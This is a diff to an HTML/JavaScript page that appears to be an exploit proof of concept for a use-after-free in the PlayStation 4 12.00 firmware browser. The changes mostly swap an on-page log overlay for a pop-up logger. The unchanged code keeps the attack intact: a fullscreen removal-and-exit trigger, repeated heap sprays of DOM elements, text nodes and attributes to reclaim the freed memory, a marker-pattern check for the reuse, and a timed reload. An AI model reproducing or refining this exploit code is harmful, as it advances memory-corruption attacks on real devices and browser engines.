@@ -3,60 +3,50 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (Robust Log)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim + External Logger</title>
 </head>
 
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (Hybrid + Stable Log)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (External Logger)</h2>
 <button onclick="runTest()">Run Test</button>
-
-<!-- LOG VISUAL ORIGINAL (mantido) -->
-<div id="log" style="margin-top:20px;"></div>
-
-<!-- 🔥 LOG ROBUSTO (overlay fixo) -->
-<textarea id="logBox"
-style="
-position:fixed;
-bottom:0;
-left:0;
-width:100%;
-height:40%;
-background:#000;
-color:#0f0;
-z-index:999999;
-font-family:monospace;
-"></textarea>
 
 <script>
 
 // ==========================
-// 🔒 LOG ROBUSTO (NOVO)
+// 🔥 LOGGER ISOLADO (REAL)
 // ==========================
-let logBuffer = [];
+let logWin = null;
+
+function initLogger() {
+    logWin = window.open("", "logger", "width=600,height=400");
+
+    if (!logWin) return;
+
+    logWin.document.write(`
+        <html>
+        <body style="background:black;color:#0f0;font-family:monospace;">
+        <h3>LOG OUTPUT</h3>
+        <pre id="log"></pre>
+        </body>
+        </html>
+    `);
+
+    logWin.document.close();
+}
 
 function log(msg) {
     try { console.log(msg); } catch(e){}
-    logBuffer.push(msg);
 
-    // mantém também log visual simples (não confiável, mas útil)
     try {
-        document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+        if (logWin && !logWin.closed) {
+            let el = logWin.document.getElementById("log");
+            if (el) {
+                el.textContent += msg + "\\n";
+            }
+        }
     } catch(e){}
 }
-
-function flushLog() {
-    let box = document.getElementById("logBox");
-    if (!box) return;
-
-    box.value = logBuffer.join("\n");
-}
-
-// captura exceções (CRÍTICO em UAF)
-window.onerror = function(e) {
-    log("[EXCEPTION] " + e);
-    flushLog();
-};
 
 // ==========================
 const PATTERN = 2.121995791e-314;
@@ -110,34 +100,25 @@ function aggressiveReclaim() {
 
     let bucket = [];
 
-    // Fase 1 — churn
     for (let i = 0; i < 8000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // Fase 2 — Element spray
     for (let i = 0; i < 10000; i++) {
         let el = document.createElement("div");
-
         el.innerHTML = "REUSE_EL_" + i;
-        el.style.position = "absolute";
-        el.style.width = "100%";
-        el.style.height = "100%";
-
         document.body.appendChild(el);
         bucket.push(el);
     }
 
-    // Fase 3 — TextNode spray
     for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
         bucket.push(txt);
     }
 
-    // Fase 4 — Attribute spray
     for (let i = 0; i < 10000; i++) {
         let el = document.createElement("div");
         el.setAttribute("data-x", "ATTR_" + i);
@@ -145,7 +126,6 @@ function aggressiveReclaim() {
         bucket.push(el);
     }
 
-    // Fase 5 — churn final
     for (let i = 0; i < 5000; i++) {
         let el = document.createElement("span");
         document.body.appendChild(el);
@@ -157,7 +137,7 @@ function aggressiveReclaim() {
 }
 
 // ==========================
-// DETECÇÃO EXPANDIDA (SEU PADRÃO)
+// DETECÇÃO (INALTERADO)
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
@@ -186,7 +166,7 @@ function checkUAF(fsTarget) {
 }
 
 // ==========================
-// TRIGGER (INALTERADO + flush)
+// TRIGGER (100% ORIGINAL)
 // ==========================
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
@@ -202,20 +182,12 @@ function trigger(fsTarget) {
         log("[ERRO] " + e);
     }
 
-    // 🔥 janela crítica original preservada
     setTimeout(() => aggressiveReclaim(), 0);
     setTimeout(() => aggressiveReclaim(), 50);
     setTimeout(() => aggressiveReclaim(), 100);
 
-    // 🔬 checagem
     setTimeout(() => checkUAF(fsTarget), 300);
 
-    // 🔥 flush ANTES do reload (CRÍTICO)
-    setTimeout(() => flushLog(), 350);
-    setTimeout(() => flushLog(), 600);
-    setTimeout(() => flushLog(), 1000);
-
-    // 🔁 comportamento original (INALTERADO)
     setTimeout(() => location.reload(), 500);
 }
 
@@ -223,10 +195,7 @@ function trigger(fsTarget) {
 // MAIN (INALTERADO)
 // ==========================
 function runTest() {
-    const logDiv = document.getElementById("log");
-    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
-
-    logBuffer = []; // limpa buffer
+    initLogger(); // 🔥 crítico
 
     log("[*] Iniciando teste");
 
@@ -236,7 +205,6 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        // ⚠️ timing CRÍTICO mantido
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
